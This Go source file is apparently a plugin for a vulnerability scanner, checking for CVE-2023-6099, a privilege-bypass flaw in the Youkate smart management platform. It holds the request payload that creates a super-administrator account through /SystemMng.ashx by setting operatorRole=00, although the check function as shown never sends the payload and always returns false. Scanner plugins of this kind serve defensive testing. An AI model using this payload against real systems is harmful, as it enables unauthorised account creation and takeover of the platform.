package goplugin

import (
	"Yscanner/utils"
)

func init() {
	Register("youkate_admin_create_cve_2023_6099", &youkate_admin_create_cve_2023_6099{})
}

type youkate_admin_create_cve_2023_6099 struct{}

func (p *youkate_admin_create_cve_2023_6099) Info() PluginInfo {
	return PluginInfo{
		Name:     "Youkate SystemMng.ashx权限管理漏洞",
		VulnInfo: "优卡特脸爱云一脸通智慧管理平台/SystemMng.ashx接口处存在权限绕过漏洞，通过输入00操纵参数operatorRole，导致特权管理不当，未经身份认证的攻击者可以通过此漏洞创建超级管理员账户，造成信息泄露和后台接管",
		VulnID:   "CVE-2023-6099",
		Level:    "9.8 CRITICAL",
		URL:      "",
		Version:  "version <= 1.0.55.0.0.1",
		CWE:      "CWE-269	权限管理不当",
	}
}

func (p *youkate_admin_create_cve_2023_6099) Check(netloc string) bool {
	rand_name := utils.GenRandom(5)
	rand_passwd := utils.GenRandom(8)
	payload := "operatorName=" + rand_name + "&operatorPwd=" + rand_passwd + "&operpassword= " + rand_passwd
	payload += "&operatorRole=00&visible_jh=%E8%AF%B7%E9%80%89%E6%8B%A9&visible_dorm=%E8%AF%B7%E9%80%89%E6%8B%A9&funcName=addOperators"
	return false
}
